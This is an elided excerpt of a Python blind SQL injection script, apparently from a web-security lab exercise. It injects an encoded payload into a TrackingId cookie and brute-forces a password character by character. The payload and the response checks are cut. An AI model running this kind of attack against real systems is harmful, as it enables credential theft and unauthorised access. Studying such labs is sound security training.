...
def sqli_password(url,TrackingId,session):
    ...
    for i in range(1,21):
        for j in range(32,126):
            ...
            cookies = {'TrackingId': TrackingId + sql_payload_encoded, 'session': session}
...
def main():
    if len(sys.argv) != 4:
        ...
        print("(+) Example: %s www.example.com 4kvqBxnpvcbcGVXk EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN" % sys.argv[0])
        sys.exit(-1)
